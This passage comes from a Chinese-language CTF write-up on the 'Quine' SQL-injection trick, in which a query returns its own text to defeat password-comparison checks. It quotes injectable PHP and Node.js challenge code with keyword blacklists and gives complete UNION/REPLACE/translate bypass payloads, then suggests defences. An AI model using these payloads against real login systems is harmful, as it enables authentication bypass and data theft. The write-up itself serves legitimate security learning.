    "/**/union/**/SELECT/**/REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")/**/AS/**/ch3ns1r#
替换双引号为单引号：
    '/**/union/**/SELECT/**/REPLACE(REPLACE('.',CHAR(34),CHAR(39)),CHAR(46),'.')/**/AS/**/ch3ns1r#
这样就和我们注入的语言是一样了，前面那个不匹配的双引号被替换成了我们注入的单引号。
所以我们如果需要最后实际注入的话，比如加入union、空格，单引号等都需要对`str`进行添加。
## 0x03 拓展
###  0x031 Holyshield CTF
源码：
    [cid] is only number.";
      exit();
    }
    if(preg_match('/cats|_|\.|rollup|join|@/i', $_GET['passcode'])) exit("");
    $result = @mysqli_fetch_array(mysqli_query($conn,$query));
    if(($result['cid']) && ($result['passcode']) && ($result['cid'] == $_GET['passcode']) && ($result['passcode'] == 1337)){
      print_r($result)."";
      $strtok = explode('cat',$result['cid']);
      $que = substr($strtok[0],-0x10);
      $query = "select secret from cats where name='{$que}'";
      $result = @mysqli_fetch_array(mysqli_query($conn,$query));
      if($result['secret']){
         echo "secret : {$result['secret']}";
      }
    }
    ?>
注意这里的逻辑：
    if(($result['cid']) && ($result['passcode']) && ($result['cid'] == $_GET['passcode']) && ($result['passcode'] == 1337))
这道赛题当时`cage`表中没有任何数据，我们要进入这个if又必须使得`cid`和`passcode`能够有返回，更关键的是，我们需要让查询到的`cid`和我们输入`passcode`的一致，且最后查询到的`passcode`要和`1337`相等，怎么办？
最后一个是最简单的我们只需要让`1337`在语句中成为`passcode`就可以。
     SQL > Select 1337 AS passcode;
    +----------+
    | passcode |
    +----------+
    |     1337 |
    +----------+
    1 row in set (0.0006 sec)
而查询到的`cid`和我们输入的`passcode`一致，这其实跟我们上面提到的赛题是异曲同工，因此我们只需要在`passcode`使用`Quine`技术，并让结果成为`cid`即可。
payload：
    ' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#') AS cid, 1337 AS passcode -- 'OR 1 limit 3,1#
注意，这里的`str`是：
    " UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#
开头的双引号不多说，跟我们上面分析的一样，这里使用`$`也是没问题的，后面相应变化就可以，`cid`和`passcode`的变化对于`str`也需要加上，最后的`OR
1 limit 3,1`是什么意思，大家可以思考一下。
###  0x032 2021qwb Quals easy_sql
源码：
    const salt = random('Aa0', 40);
    const HashCheck = sha256(sha256(salt + 'admin')).toString();
    let filter = (data) => {
        let blackwords = ['alter', 'insert', 'drop', 'delete', 'update', 'convert', 'chr', 'char', 'concat', 'reg', 'to', 'query'];
        let flag = false;
        if (typeof data !== 'string') return true;
        blackwords.forEach((value, idx) => {
            if (data.includes(value)) {
                console.log(`filter: ${value}`);
                return (flag = true);
            }
        });
        let limitwords = ['substring', 'left', 'right', 'if', 'case', 'sleep', 'replace', 'as', 'format', 'union'];
        limitwords.forEach((value, idx) => {
            if (count(data, value) > 3){
                console.log(`limit: ${value}`);
                return (flag = true);
            }
        });
        return flag;
    }
    app.get('/source', async (req, res, next) => {
        fs.readFile('./source.txt', 'utf8', (err, data) => {
            if (err) {
                res.send(err);
            }
            else {
                res.send(data);
            }
        });
    });
    app.all('/', async (req, res, next) => {
        if (req.method == 'POST') {
            if (req.body.username && req.body.password) {
                let username = req.body.username.toLowerCase();
                let password = req.body.password.toLowerCase();
                if (username === 'admin') {
                    res.send(``);
                    return;
                }
                UserHash = sha256(sha256(salt + username)).toString();
                if (UserHash !== HashCheck) {
                    res.send(``);
                    return;
                }
                if (filter(password)) {
                    res.send(``);
                    return;
                }
                let sql = `select password,username from users where username='${username}' and password='${password}';`;
                client.query(sql, [], (err, data) => {
                    if (err) {
                        res.send(``);
                        return;
                    }
                    else {
                        if ((typeof data !== 'undefined') && (typeof data.rows[0] !== 'undefined') && (data.rows[0].password === password)) {
                            res.send(``);
                            return;
                        }
                        else {
                            res.send(``);
                            return;
                        }
                    }
                });
            }
        }
        res.render('index');
        return;
    });
这个题目的具体解法安全客就有，大家有兴趣可以移步去看，我们只关注`Quine`部分。
注意这里的逻辑
    if ((typeof data !== 'undefined') && (typeof data.rows[0] !== 'undefined') && (data.rows[0].password === password)) {
                            res.send(``);
                            return;
其实这里就是典型的`Quine`，只不过这道题的数据库是`pgsql`，而且`REPLACE`函数被禁了。值得注意的是，`pgsql`下的`current_query`是可以获取当前执行的语句的，长亭的WP中似乎想要使用这种方法，但是没能成功，最后他们使用了堆叠注入并引入语法错误抵消`query`在`commit`后为空的情况。另外看了几个强队的WP也是这种解法。
有一种[解法](https://www.anquanke.com/post/id/244156#h3-7)值得注意，看起来似乎使用了使用了`Quine`进行盲注，但其实思考过就会明白这道题只需要构造一个合理的`Quine`即可，不需要盲注。
这个脚本中`for`循环是没什么用的，实际有用的`payload`是：
    ' union SELECT REPLACE(translate('" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ',(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),'" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ') AS dem0--    
这说明了，`translate`也是可以代理`replace`的，这也给我们提供了新的思路。（只不过没想懂为什么有这么多`select hint from
hint`）
## 0x04 可行的防御措施
`Quine`本身是个很危险的技术，对于开发人员而言题目中出现的逻辑并不鲜见，可行的防御方法是将`REPLACE`、`TRANSLATE`等函数也纳入黑名单，同时对查询获取到的结果做正则匹配，这样就可以一定程度防御`Quine`的攻击。